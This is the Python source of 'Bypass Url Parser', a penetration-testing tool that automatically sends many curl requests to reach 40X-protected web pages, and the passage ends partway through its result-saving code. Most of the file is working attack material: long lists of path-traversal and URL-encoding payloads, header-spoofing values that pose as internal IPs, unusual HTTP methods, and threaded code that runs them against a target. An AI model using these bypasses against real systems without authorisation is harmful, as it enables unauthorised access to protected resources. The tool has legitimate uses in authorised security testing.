#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Bypass Url Parser, made with love by @TheLaluka
A tool that tests MANY url bypasses to reach a 40X protected page.

Usage:
    ./bypass-url-parser.py -u <URL> [(-m <mode>)...] [-o <outdir>] [-S <level>] [(-H <header>)...] [-r <num>]
                           [-s <ip>] [--spoofip-replace] [-p <port>] [--spoofport-replace]
                           [-t <threads>] [-T <timeout>] [-x <proxy_url>] [-v | -d | -dd]

Program options:
    -H, --header <header>     Header(s) to use, format: "Cookie: can_i_haz=fire"
    -m, --mode <mode>         Bypass modes. See 'Bypasser.bypass_modes' in code [Default: all]
    -o, --outdir <outdir>     Output directory for results
    -x, --proxy <proxy_url>   Set a proxy in the format http://proxy_ip:port.
    -S, --save-level <level>  Save results level. From 0 (DISABLE) to 3 (FULL) [Default: 1]
    -s, --spoofip <ip>        IP(s) to inject in ip-specific headers
    -p, --spoofport <port>    Port(s) to inject in port-specific headers
    -r, --retry <num>         Retry attempts of failed requests. Set 0 to disable all retry tentatives [Default: 3]
    -t, --threads <threads>   Scan with N parallel threads [Default: 1]
    -T, --timeout <timeout>   Request times out after N seconds [Default: 5]
    -u, --url <URL>           URL (path is optional) to run bypasses against

General options:
    -h, --help                Show help, you are here :)
    -v, --verbose             Verbose output
    -d, --debug               Show more details like curl commands generated by this tool
    -dd, --debug              Print Debug level 2 (with all classes debug_class output)
    -V, --version             Show version info

Misc options:
    --spoofip-replace         Disable list of default internal IPs in 'http_headers_ip' bypass mode
    --spoofport-replace       Disable list of default internal ports in 'http_headers_port' bypass mode

Examples:
    ./bypass-url-parser.py -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d
    ./bypass-url-parser.py -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test"
"""

from __future__ import annotations

from collections import defaultdict

import coloredlogs
import concurrent.futures
import hashlib
import logging
import os
import platform
import re
import socket
import subprocess
import sys
import tempfile
from docopt import docopt
from enum import IntEnum
from pathlib import Path
from shutil import which
from urllib.parse import urlparse, ParseResult

VERSION = "0.2.0"
logger = logging.getLogger("bup")


class Bypasser:
    class SaveLevel(IntEnum):
        NONE = 0  # Disable output saving
        MINIMAL = 1  # Only save the program log file which contains the results
        PERTINENT = 2  # Save the program log file and pertinent (results) curl responses in separate html files.
        FULL = 3  # Save the program log file and all curl responses in separate html files.

    # Default class values
    regex_url = re.compile(r"^https?://[^/]+", re.IGNORECASE)
    regex_proxy_url = re.compile(r"^https?://.*:\d{2,5}$", re.IGNORECASE)
    bypass_modes = ["all", "mid_paths", "end_paths", "http_host", "http_methods", "http_versions", "case_substitution",
                    "unicode", "char_encode", "http_headers_method", "http_headers_scheme", "http_headers_ip",
                    "http_headers_port", "http_headers_url", "misc"]  # Not yet all implemented, coming soon
    default_bypass_mode = "all"
    default_log_filename = "triaged-bypass.log"
    default_save_level = SaveLevel.MINIMAL
    default_spoof_ip_replace = False
    default_spoof_port_replace = False
    default_timeout = 5
    default_thread_number = 10
    default_retry_number = 3
    default_http_version = "0"  # Disabled by default. Lets curl to manage its own version of HTTP by default
    default_output_dir = f"{tempfile.TemporaryDirectory().name}-bypass-url-parser"
    default_user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36"

    # Internal bypass lists
    const_internal_ips = list()
    const_internal_ips.append("*")
    const_internal_ips.append("0.0.0.0")
    const_internal_ips.append("0177.1")  # Encoded IP - kudos to @Agarri_FR
    const_internal_ips.append("10.0.0.1")
    const_internal_ips.append("127.0.0.1")
    const_internal_ips.append("172.17.0.1")  # Default docker0 iface - kudos to @jtop_fap
    const_internal_ips.append("192.168.0.2")
    const_internal_ips.append("192.168.1.1")
    const_internal_ips.append("8.8.8.8")
    const_internal_ips.append("localhost")
    const_internal_ips.append("norealhost")
    const_internal_ips.append("null")

    const_http_methods = list()
    const_http_methods.append("CONNECT")
    const_http_methods.append("GET")
    const_http_methods.append("LOCK")
    const_http_methods.append("OPTIONS")
    const_http_methods.append("PATCH")
    const_http_methods.append("POST")
    const_http_methods.append("POUET")
    const_http_methods.append("PUT")
    const_http_methods.append("TRACE")
    const_http_methods.append("TRACK")
    const_http_methods.append("UPDATE")

    const_header_schemes = list()
    const_header_schemes.append("X-Forwarded-Scheme")  # http https

    const_protos = list()
    const_protos.append("http")
    const_protos.append("https")
    const_protos.append("foo")

    const_header_ports = list()
    const_header_ports.append("X-Forwarded-Port")

    const_ports = list()
    const_ports.append("443")
    const_ports.append("4443")
    const_ports.append("80")
    const_ports.append("8080")
    const_ports.append("8443")

    const_header_hosts = list()
    const_header_hosts.append("Access-Control-Allow-Origin")
    const_header_hosts.append("Base-Url")
    const_header_hosts.append("CF-Connecting_IP")
    const_header_hosts.append("CF-Connecting-IP")
    const_header_hosts.append("Client-IP")
    const_header_hosts.append("Content-Length")
    const_header_hosts.append("Destination")
    const_header_hosts.append("Forwarded-For-IP")
    const_header_hosts.append("Forwarded-For")
    const_header_hosts.append("Forwarded")
    const_header_hosts.append("Host")
    const_header_hosts.append("Http-Url")
    const_header_hosts.append("Origin")
    const_header_hosts.append("Profile")
    const_header_hosts.append("Proxy-Host")
    const_header_hosts.append("Proxy-Url")
    const_header_hosts.append("Proxy")
    const_header_hosts.append("Real-Ip")
    const_header_hosts.append("Redirect")
    const_header_hosts.append("Referer")
    const_header_hosts.append("Referrer")
    const_header_hosts.append("Request-Uri")
    const_header_hosts.append("True-Client-IP")
    const_header_hosts.append("Uri")
    const_header_hosts.append("Url")
    const_header_hosts.append("X-Arbitrary")
    const_header_hosts.append("X-Client-IP")
    const_header_hosts.append("X-Custom-IP-Authorization")
    const_header_hosts.append("X-Forward-For")
    const_header_hosts.append("X-Forwarded-By")
    const_header_hosts.append("X-Forwarded-For-Original")
    const_header_hosts.append("X-Forwarded-For")
    const_header_hosts.append("X-Forwarded-Host")
    const_header_hosts.append("X-Forwarded-Proto")
    const_header_hosts.append("X-Forwarded-Server")
    const_header_hosts.append("X-Forwarded")
    const_header_hosts.append("X-Forwarder-For")
    const_header_hosts.append("X-Host")
    const_header_hosts.append("X-Http-Destinationurl")
    const_header_hosts.append("X-HTTP-DestinationURL")
    const_header_hosts.append("X-Http-Host-Override")
    const_header_hosts.append("X-Original-Remote-Addr")
    const_header_hosts.append("X-Original-URL")
    const_header_hosts.append("X-Originally-Forwarded-For")
    const_header_hosts.append("X-Originating-")
    const_header_hosts.append("X-Originating-IP")
    const_header_hosts.append("X-Proxy-Url")
    const_header_hosts.append("X-ProxyUser-Ip")
    const_header_hosts.append("X-Real-Ip")
    const_header_hosts.append("X-Referrer")
    const_header_hosts.append("X-Remote-Addr")
    const_header_hosts.append("X-Remote-IP")
    const_header_hosts.append("X-Rewrite-URL")
    const_header_hosts.append("X-WAP-Profile")

    const_paths = list()
    const_paths.append(";")
    const_paths.append(";/.;.")
    const_paths.append(";/..;")
    const_paths.append(";/..")
    const_paths.append(";/../;/../")
    const_paths.append(";/../;/")
    const_paths.append(";/../.;/../")
    const_paths.append(";/../../")
    const_paths.append(";/../..//")
    const_paths.append(";/.././../")
    const_paths.append(";/../")
    const_paths.append(";/..//../")
    const_paths.append(";/..//")
    const_paths.append(";/..///")
    const_paths.append(";/..//%2e%2e/")
    const_paths.append(";/..//%2f")
    const_paths.append(";/../%2f/")
    const_paths.append(";/..%2f..%2f")
    const_paths.append(";/..%2f")
    const_paths.append(";/..%2f/")
    const_paths.append(";/..%2f//")
    const_paths.append(";/..%2f%2f../")
    const_paths.append(";/.%2e")
    const_paths.append(";/.%2e/%2e%2e/%2f")
    const_paths.append(";//..")
    const_paths.append(";//../../")
    const_paths.append(";///..")
    const_paths.append(";///../")
    const_paths.append(";///..//")
    const_paths.append(";//%2f../")
    const_paths.append(";/%2e.")
    const_paths.append(";/%2e%2e")
    const_paths.append(";/%2e%2e/")
    const_paths.append(";/%2e%2e%2f/")
    const_paths.append(";/%2e%2e%2f%2f")
    const_paths.append(";/%2f/../")
    const_paths.append(";/%2f/..%2f")
    const_paths.append(";/%2f%2f../")
    const_paths.append(";%09;")
    const_paths.append(";%09..;")
    const_paths.append(";%09..")
    const_paths.append(";%09")
    const_paths.append(";%2f;/;/..;/")
    const_paths.append(";%2f;//../")
    const_paths.append(";%2f..;/;//")
    const_paths.append(";%2f..;//;/")
    const_paths.append(";%2f..;///")
    const_paths.append(";%2f..")
    const_paths.append(";%2f../;/;/;")
    const_paths.append(";%2f../;/;/")
    const_paths.append(";%2f../;//")
    const_paths.append(";%2f..//;/;")
    const_paths.append(";%2f..//;/")
    const_paths.append(";%2f..//../")
    const_paths.append(";%2f..//..%2f")
    const_paths.append(";%2f..///;")
    const_paths.append(";%2f..///")
    const_paths.append(";%2f../%2f../")
    const_paths.append(";%2f../%2f..%2f")
    const_paths.append(";%2f..%2f..%2f%2f")
    const_paths.append(";%2f..%2f/../")
    const_paths.append(";%2f..%2f/..%2f")
    const_paths.append(";%2f..%2f/")
    const_paths.append(";%2f..%2f%2e%2e%2f%2f")
    const_paths.append(";%2f/;/..;/")
    const_paths.append(";%2f/;/../")
    const_paths.append(";%2f//..;/")
    const_paths.append(";%2f//../")
    const_paths.append(";%2f//..%2f")
    const_paths.append(";%2f/%2f../")
    const_paths.append(";%2f%2e%2e")
    const_paths.append(";%2f%2e%2e%2f%2e%2e%2f%2f")
    const_paths.append(";%2f%2f/../")
    const_paths.append(";x;")
    const_paths.append(";x")
    const_paths.append(";x/")
    const_paths.append("???")
    const_paths.append("??")
    const_paths.append("?")
    const_paths.append(".;/")
    const_paths.append("..;")
    const_paths.append("..;/")
    const_paths.append("..;\\;")
    const_paths.append("..;\\\\")
    const_paths.append("..;%00/")
    const_paths.append("..;%0d/")
    const_paths.append("..;%ff/")
    const_paths.append("..")
    const_paths.append(".././")
    const_paths.append("../")
    const_paths.append("..\\;")
    const_paths.append("..\\\\")
    const_paths.append("..%00;/")
    const_paths.append("..%00/;")
    const_paths.append("..%00/")
    const_paths.append("..%09")
    const_paths.append("..%0d;/")
    const_paths.append("..%0d/;")
    const_paths.append("..%0d/")
    const_paths.append("..%2f")
    const_paths.append("..%3B")
    const_paths.append("..%5c")
    const_paths.append("..%5c/")
    const_paths.append("..%ff;/")
    const_paths.append("..%ff")
    const_paths.append("..%ff/;")
    const_paths.append("./.")
    const_paths.append("./")
    const_paths.append(".//./")
    const_paths.append(".%2e/")
    const_paths.append(".html")
    const_paths.append(".json")
    const_paths.append("/;/")
    const_paths.append("/;//")
    const_paths.append("/;x")
    const_paths.append("/;x/")
    const_paths.append("/.;/")
    const_paths.append("/.;//")
    const_paths.append("/..;/;/..;/")
    const_paths.append("/..;/;/")
    const_paths.append("/..;/..;/")
    const_paths.append("/..;/../")
    const_paths.append("/..;/")
    const_paths.append("/..;//..;/")
    const_paths.append("/..;//../")
    const_paths.append("/..;//")
    const_paths.append("/..;%2f..;%2f..;%2f")
    const_paths.append("/..;%2f..;%2f")
    const_paths.append("/..;%2f")
    const_paths.append("/..")
    const_paths.append("/../;/../")
    const_paths.append("/../;/")
    const_paths.append("/../.;/../")
    const_paths.append("/../..;/")
    const_paths.append("/../../../")
    const_paths.append("/../../..//")
    const_paths.append("/../../")
    const_paths.append("/../..//../")
    const_paths.append("/../..//")
    const_paths.append("/.././../")
    const_paths.append("/../")
    const_paths.append("/..//..;/")
    const_paths.append("/..//../../")
    const_paths.append("/..//../")
    const_paths.append("/..//")
    const_paths.append("/..%2f..%2f..%2f")
    const_paths.append("/..%2f..%2f")
    const_paths.append("/..%2f")
    const_paths.append("/.")
    const_paths.append("/./")
    const_paths.append("/.//")
    const_paths.append("/.randomstring")
    const_paths.append("/")
    const_paths.append("/*")
    const_paths.append("/*/")
    const_paths.append("//;/")
    const_paths.append("//?anything")
    const_paths.append("//.;/")
    const_paths.append("//..;")
    const_paths.append("//..")
    const_paths.append("//../../")
    const_paths.append("//.")
    const_paths.append("//./")
    const_paths.append("//")
    const_paths.append("///..;")
    const_paths.append("///..;/")
    const_paths.append("///..;//")
    const_paths.append("///..")
    const_paths.append("///../")
    const_paths.append("///..//")
    const_paths.append("////")
    const_paths.append("/%20#")
    const_paths.append("/%20%20/")
    const_paths.append("/%20%23")
    const_paths.append("/%252e/")
    const_paths.append("/%252e%252e%252f/")
    const_paths.append("/%252e%252e%253b/")
    const_paths.append("/%252e%252f/")
    const_paths.append("/%252e%253b/")
    const_paths.append("/%252f")
    const_paths.append("/%2e/")
    const_paths.append("/%2e//")
    const_paths.append("/%2e%2e")
    const_paths.append("/%2e%2e/")
    const_paths.append("/%2e%2e%3b/")
    const_paths.append("/%2e%2f/")
    const_paths.append("/%2e%3b/")
    const_paths.append("/%2e%3b//")
    const_paths.append("/%2f")
    const_paths.append("/%3b/")
    const_paths.append("/x/;/..;/")
    const_paths.append("/x/;/../")
    const_paths.append("/x/..;/;/")
    const_paths.append("/x/..;/")
    const_paths.append("/x/..;//")
    const_paths.append("/x/../;/")
    const_paths.append("/x/../")
    const_paths.append("/x/..//")
    const_paths.append("/x//..;/")
    const_paths.append("/x//../")
    const_paths.append("\\..\\.\\")
    const_paths.append("&")
    const_paths.append("#?")
    const_paths.append("#")
    const_paths.append("%")
    const_paths.append("%09;")
    const_paths.append("%09..")
    const_paths.append("%09")
    const_paths.append("%09%3b")
    const_paths.append("%20")
    const_paths.append("%20/")
    const_paths.append("%23")
    const_paths.append("%23%3f")
    const_paths.append("%252f/")
    const_paths.append("%252f%252f")
    const_paths.append("%26")
    const_paths.append("%2e")
    const_paths.append("%2e/")
    const_paths.append("%2e%2e")
    const_paths.append("%2e%2e/")
    const_paths.append("%2e%2e%2f")
    const_paths.append("%2f")
    const_paths.append("%2f/")
    const_paths.append("%2f%20%23")
    const_paths.append("%2f%23")
    const_paths.append("%2f%2f")
    const_paths.append("%2f%3b%2f")
    const_paths.append("%2f%3b%2f%2f")
    const_paths.append("%2f%3f")
    const_paths.append("%2f%3f/")
    const_paths.append("%3b")
    const_paths.append("%3b/..")
    const_paths.append("%3b//%2f../")
    const_paths.append("%3b/%2e.")
    const_paths.append("%3b/%2e%2e/..%2f%2f")
    const_paths.append("%3b/%2f%2f../")
    const_paths.append("%3b%09")
    const_paths.append("%3b%2f..")
    const_paths.append("%3b%2f%2e.")
    const_paths.append("%3b%2f%2e%2e")
    const_paths.append("%3b%2f%2e%2e%2f%2e%2e%2f%2f")
    const_paths.append("%3f")
    const_paths.append("%3f%23")
    const_paths.append("%3f%3f")

    def __init__(self, config_dict=None, verbose=False, debug=False, debug_class=False, ext_logger=None):
        if not config_dict:
            config_dict = dict()

        # Init verbose and/or debug level
        if config_dict and "--verbose" in config_dict.keys() and "--debug" in config_dict.keys():
            self.verbose = config_dict.get("--verbose", False)
            self.debug = False
            self.debug_class = False
            self._init_debug_level(config_dict.get("--debug"))
        else:
            self.verbose = True if verbose or debug or debug_class else False
            self.debug = True if debug or debug_class else False
            self.debug_class = debug_class

        # Get a logger
        if ext_logger:
            self.logger = ext_logger
        else:
            self.logger = Tools.get_new_logger(self.use_classname(), with_colors=True, debug_level=self.debug)

        if self.debug_class:
            self.logger.debug(f"Debug level: verbose={self.verbose}, debug={self.debug}, "
                              f"debug_class={self.debug_class}")

        # Init object vars
        self.quote = "'"
        self.base_curl = ""
        self.user_agent_suffix = ""
        self.curls = list()
        self.curl_items = list()
        self.grouped_curl_items = defaultdict(list)
        self.bypass_results = defaultdict(defaultdict)
        self.to_retry_items = list()
        self.clean_output = ""

        # Init properties
        self.http_version = Bypasser.default_http_version
        self.user_agent = Bypasser.default_user_agent
        self.proxy = config_dict.get("--proxy")
        self.current_bypass_modes = config_dict.get("--mode")
        self.headers = config_dict.get("--header", [])
        self.output_dir = config_dict.get("--outdir")
        self.save_level = config_dict.get("--save-level")
        self.spoof_ip_replace = config_dict.get("--spoofip-replace")  # If False spoof_ips append to existing list
        self.spoof_ips = config_dict.get("--spoofip")
        self.spoof_port_replace = config_dict.get("--spoofport-replace")  # If False spoof_ports append to existing list
        self.spoof_ports = config_dict.get("--spoofport")
        self.threads = config_dict.get("--threads")
        self.timeout = config_dict.get("--timeout")
        self.retry_number = config_dict.get("--retry")
        self.urls = config_dict.get("--url")

    # *** Protected methods *** #

    def _init_curl_base(self, force_user_agent=None, debug=False) -> str:
        """ Build curl base command.

        User-agent prevalence rule : force_user_agent > -H "User-agent: xxx" > Bypasser.default_user_agent

        :param str force_user_agent: Forced user-agent
        :param bool debug: If True, log the obtained base command at the end of this method
        """
        # Specify curl binary
        binary_name = which("curl")  # Mandatory for subprocess.Popen()
        if not binary_name:
            self.logger.error("Program curl not found, install it and ensure it's within your PATH")
            exit(1)
        self.base_curl = [binary_name]
        # Add sane base options
        self.base_curl.append("-sS")
        self.base_curl.append("-kgi")
        self.base_curl.append("--path-as-is")
        # HTTP version
        if self.http_version != "0":
            self.base_curl.append(f"--http{self.http_version}")
        # HTTP proxy
        if self.proxy:
            self.base_curl.extend(["-x", self.proxy])

        # Custom headers
        print(self.headers)
        for key, value in self.headers.items():
            if key.lower() == "user-agent":
                key = "User-Agent" # Overwrite real curl user-agent
                # Internal hook for User-Agent
                if self.user_agent_suffix:
                    value = f"{value}{self.user_agent_suffix}"
            self.base_curl.extend(["-H", f"{key}: {value}"])

        if debug:
            self.logger.debug(f"Base curl command: {' '.join(self.base_curl)}")
        return self.base_curl

    def _init_debug_level(self, level):
        if level:
            self.verbose = True
            if level == 1:
                self.debug = True
                self.debug_class = False
            elif level == 2:
                self.debug = True
                self.debug_class = True
            else:
                error_msg = f"Bad debug number argument value => {level}. Only support 2 level [-d or -dd]"
                raise ValueError(error_msg)
        else:
            self.debug = False
            self.debug_class = False

    def _init_progress_bar(self, total, prefix="", suffix="", decimals=1, length=100, fill="█") -> None:
        """ Init progress bar components.

        Inspired from https://stackoverflow.com/a/34325723/355230

        :param int total: Total iterations
        :param str prefix: Prefix string
        :param str suffix: Suffix string
        :param int decimals: Positive number of decimals in percent complete
        :param int length: Character length of bar
        :param str fill: bar fill character
        """
        self.decimals = decimals
        self.iteration = 1
        self.total = total
        self.length = length
        self.fill = fill
        self.print_end = "\r" if Tools.is_linux else ""
        self.prefix = prefix
        self.suffix = suffix

    def _generate_curls(self, url_obj: ParseResult):
        if self.verbose:
            self.logger.warning(f"Stage: generate_curls for {url_obj.geturl()} url")

        # Get information from url
        base_url = f"{url_obj.scheme}://{url_obj.netloc}"
        base_path = f"{url_obj.path}{url_obj.query}"
        target_url = url_obj.geturl()
        self.logger.debug(f"URL {target_url} parsing: base_url={self.quote}{base_url}{self.quote}, "
                          f"base_path={self.quote}{base_path}{self.quote}")

        # Reset curl list
        self.curl_items.clear()

        # Get the public IP of this URL
        url_public_ip = socket.gethostbyname(str(url_obj.hostname))

        # Original request
        cmd = [*self.base_curl, target_url]
        item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="original_request", target_ip=url_public_ip,
                        debug=self.debug, ext_logger=self.logger)
        if item not in self.curl_items:
            self.curl_items.append(item)

        # [http_methods] - Custom methods
        if "all" in self.current_bypass_modes or "http_methods" in self.current_bypass_modes:
            for const_http_method in Bypasser.const_http_methods:
                cmd = [*self.base_curl, "-X", const_http_method, target_url]
                item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="http_methods", target_ip=url_public_ip,
                                debug=self.debug, ext_logger=self.logger)
                if item not in self.curl_items:
                    self.curl_items.append(item)

        # [http_headers_ip] - Custom host injection headers
        if "all" in self.current_bypass_modes or "http_headers_ip" in self.current_bypass_modes:
            for const_header_host in Bypasser.const_header_hosts:
                if self.spoof_ips:
                    # Custom IP addresses
                    for spoof_ip in self.spoof_ips:
                        cmd = [*self.base_curl, "-H", f"{const_header_host}: {spoof_ip}", target_url]
                        item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="http_headers_ip",
                                        target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                        if item not in self.curl_items:
                            self.curl_items.append(item)
                if not self.spoof_ip_replace:  # False in any case if self.spoof_ips is empty
                    # Internal IP addresses
                    for const_internal_ip in Bypasser.const_internal_ips:
                        cmd = [*self.base_curl, "-H", f"{const_header_host}: {const_internal_ip}", target_url]
                        item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="http_headers_ip",
                                        target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                        if item not in self.curl_items:
                            self.curl_items.append(item)
                    # Public IP address related to the url subdomain
                    cmd = [*self.base_curl, "-H", f"{const_header_host}: {url_public_ip}", target_url]
                    item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="http_headers_ip",
                                    target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                    if item not in self.curl_items:
                        self.curl_items.append(item)

        # [http_headers_scheme] - Custom scheme rewrite with X-Forwarded-Scheme
        if "all" in self.current_bypass_modes or "http_headers_scheme" in self.current_bypass_modes:
            for const_header_scheme in Bypasser.const_header_schemes:
                for const_proto in Bypasser.const_protos:
                    cmd = [*self.base_curl, "-H", f"{const_header_scheme}: {const_proto}", target_url]
                    item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="http_headers_scheme",
                                    target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                    if item not in self.curl_items:
                        self.curl_items.append(item)

        # [http_headers_port] Custom port rewrite
        if "all" in self.current_bypass_modes or "http_headers_port" in self.current_bypass_modes:
            for const_header_port in Bypasser.const_header_ports:
                if self.spoof_ports:
                    # Custom port(s)
                    for spoof_port in self.spoof_ports:
                        cmd = [*self.base_curl, "-H", f"{const_header_port}: {spoof_port}", target_url]
                        item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="http_headers_port",
                                        target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                        if item not in self.curl_items:
                            self.curl_items.append(item)
                if not self.spoof_port_replace:  # False in any case if self.spoof_ports is empty
                    # Internal ports
                    for const_port in Bypasser.const_ports:
                        cmd = [*self.base_curl, "-H", f"{const_header_port}: {const_port}", target_url]
                        item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="http_headers_port",
                                        target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                        if item not in self.curl_items:
                            self.curl_items.append(item)

        # [mid_paths] - Custom paths with extra-mid-slash
        if "all" in self.current_bypass_modes or "mid_paths" in self.current_bypass_modes:
            for idx_slash in range(base_path.count("/")):
                for const_path in Bypasser.const_paths:
                    path_post = Tools.replacenth(base_path, "/", f"/{const_path}", idx_slash)
                    # First variant
                    cmd = [*self.base_curl, f"{base_url}{path_post}"]
                    item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="mid_paths", target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                    if item not in self.curl_items:
                        self.curl_items.append(item)
                    # Second variant
                    cmd = [*self.base_curl, f"{base_url}/{path_post}"]
                    item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="mid_paths", target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                    if item not in self.curl_items:
                        self.curl_items.append(item)
                    if idx_slash <= 1:
                        continue

                    path_pre = Tools.replacenth(base_path, "/", f"{const_path}/", idx_slash)
                    # Fist variant
                    cmd = [*self.base_curl, f"{base_url}{path_pre}"]
                    item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="mid_paths", target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                    if item not in self.curl_items:
                        self.curl_items.append(item)
                    # Second variant
                    cmd = [*self.base_curl, f"{base_url}/{path_pre}"]
                    item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="mid_paths", target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                    if item not in self.curl_items:
                        self.curl_items.append(item)

        # Char substitution (character-by-character) bypasses
        abc_indexes = [span.start() for span in re.finditer(r"[a-zA-Z]", base_path)]
        for abc_index in abc_indexes:
            # [case_substitution] - Case-Inversion
            if "all" in self.current_bypass_modes or "case_substitution" in self.current_bypass_modes:
                char_case = base_path[abc_index]
                char_case = char_case.upper() if char_case.islower() else char_case.lower()
                cmd = [*self.base_curl, f"{base_url}/{base_path[:abc_index]}{char_case}{base_path[abc_index + 1:]}"]
                item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="case_substitution", target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                if item not in self.curl_items:
                    self.curl_items.append(item)

            # [char_encode] - Url-Encoding
            if "all" in self.current_bypass_modes or "char_encode" in self.current_bypass_modes:
                char_urlencoded = format(ord(base_path[abc_index]), "02x")
                cmd = [*self.base_curl, f"{base_url}/{base_path[:abc_index]}%{char_urlencoded}{base_path[abc_index + 1:]}"]
                item = CurlItem(url_obj, self.base_curl, cmd, bypass_mode="char_encode", target_ip=url_public_ip, debug=self.debug, ext_logger=self.logger)
                if item not in self.curl_items:
                    self.curl_items.append(item)

        # Verbose/debug print
        if self.verbose:
            self.logger.info(f"Payloads to test: {len(self.curl_items)}")

        # IDEA Generate moooooore with cross products?
        # Not doing for now, so many curls already... :)
        return

    def _progress_bar_callback(self, *args):
        if self.iteration % 100 == 0:
            self.logger.info(f"Doing: {self.iteration} / {self.total}")
        self.iteration = self.iteration + 1

    def _run_curls(self, items):
        """ Call multithread curl commands.

        :param list[CurlItem] items: List of item objects
        """
        # Init internal progress bar
        self._init_progress_bar(len(items), prefix="Send curl requests:",
                                suffix=f"({self.threads} threads, timeout {self.timeout}s)")

        if self.verbose:
            self.logger.warning(f"Stage: run_curls")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            for item in items:
                future = executor.submit(self._run_curl, item)
                future.add_done_callback(self._progress_bar_callback)
            executor.shutdown(wait=True)
        return

    def _run_curl(self, item):
        """ Exec curl command.

        :param CurlItem item: Item object
        """
        if self.debug:
            self.logger.info(f"Current: {item.request_curl_cmd}")
            # input("paused")
        try:
            process = subprocess.Popen(item.request_curl_cmd, text=True, shell=False, stderr=subprocess.STDOUT,
                                       stdout=subprocess.PIPE)

            # Get command results
            result = process.communicate(timeout=self.timeout)[0]
            # Successful execution, parse result
            if process.returncode == 0:
                if result:
                    # Apply xxx2unix. Mandatory under Windows/macOS to save curl responses headers in html file
                    # Notes: subprocess.Popen with text=True => universal_newlines=True so maybe useless
                    result = result.replace(os.linesep, "\n")

                    # Store command result in CurlItem object
                    if not self.proxy:
                        item.response_raw_output = result
                    else:
                        # Delete the additional response proxy header 'HTTP/1.0 200 Connection established'
                        item.response_raw_output = result.split("\n", 2)[2]

                    # Remove from retry list if present
                    if item in self.to_retry_items:
                        self.to_retry_items.remove(item)
                else:
                    error_msg = f"Command {item.request_curl_cmd} succeeds but returns no result"
                    self.logger.error(error_msg)
                    raise ValueError(error_msg)
            # Raise a detailed CalledProcessError when the return code != 0
            else:
                raise subprocess.CalledProcessError(process.returncode, item.request_curl_cmd, output=result)

        except subprocess.CalledProcessError as e:
            if self.verbose:
                self.logger.warning(f"command '{e.cmd}' returned on-zero error code {e.returncode}: {e.output}")
            # curl: (92) HTTP/2 stream 0 was not closed cleanly: PROTOCOL_ERROR (err 1)
            if e.returncode == 92:
                # With recent curl versions, can occur with HTTP/2 and the CONNECT method
                if self.verbose:
                    self.logger.warning("Curl HTTP/2 with HTTP/1.1 upgrade failed. Force HTTP/1.1 for this request "
                                        "and add to retry list")
                # Force or add HTTP version 1.1 in item curl command
                item.force_http_version("1.1")

                # Add modified item in retry list
                if item not in self.to_retry_items:
                    self.to_retry_items.append(item)
            else:
                if item not in self.to_retry_items:
                    self.to_retry_items.append(item)

        except subprocess.TimeoutExpired as e:
            if self.verbose:
                self.logger.warning(f"command '{e.cmd}' timed out: {e.output}")
            if item not in self.to_retry_items:
                self.to_retry_items.append(item)

    def _save_results(self, url_obj):
        if self.save_level != self.SaveLevel.NONE:
            # Output_directory definition and creation
            outdir = self.output_dir
            try:
                # If multiple URLs, add one subdirectory by url
                if len(self.urls) > 1:
                    # Format: output_dir / https - www.tld.com[-port -] - path - endpoint
                    subdir_name = f"{url_obj.scheme}-{url_obj.netloc.replace(':', '-')}{url_obj.path.replace('/', '-')}"
                    outdir = f"{self.output_dir}{Tools.separator}{subdir_name}"
                # Create directory
                if Tools.is_exist_directory(outdir, force_create=True):
                    if self.debug_class:
                        self.logger.debug(f"Output directory '{outdir}{Tools.separator}' exists on system")
            except Exception as e:
                error_msg = f"Error while creating output directory '{outdir}{Tools.separator}': {e}"
                self.logger.error(error_msg)
                raise ValueError(error_msg)

            # SaveLevel.FULL - Save all items
            if self.save_level >= self.SaveLevel.FULL:
                for item in self.curl_items:
                    # Save only completed requests
                    if item not in self.to_retry_items:
                        if not item.save(outdir, force_output_dir_creation=False):
                            self.logger.warning(f"Error when saving {outdir}{Tools.separator}{item.filename} file.")
                if self.verbose:
                    self.logger.info(
                        f"All curl responses were saved in the '{outdir}{Tools.separator}' "
                        f"directory")

            # SaveLevel.PERTINENT - Save only results items (single and first element of each group)
            elif self.save_level >= self.SaveLevel.PERTINENT:
                if self.bypass_results[url_obj]:
                    for url, item_lst in self.bypass_results[url_obj].items():
                        if not item_lst[0].save(outdir, force_output_dir_creation=False):
                            self.logger.warning(f"Error when saving {outdir}{Tools.separator}{item_lst[0].filename} "
                                                f"file.")
                    if self.verbose:
                        self.logger.info(f"Only relevant curl responses (results) were saved in the"
                                         f" '{outdir}{Tools.separator}' directory")
                else:
                    self.logger.warning("No output to save")

            # Batcat - Starting at SaveLevel.PERTINENT, IOW no html files, no batcat command
            inspect_cmd = ""
            if self.save_level >= self.SaveLevel.PERTINENT and Tools.is_linux:
                # Get first item filename of each group
                filename_lst = list()
                for out_key, item_lst in self.grouped_curl_items.items():
                    filename = item_lst[0].filename
                    if filename not in filename_lst:
                        filename_lst.append(filename)
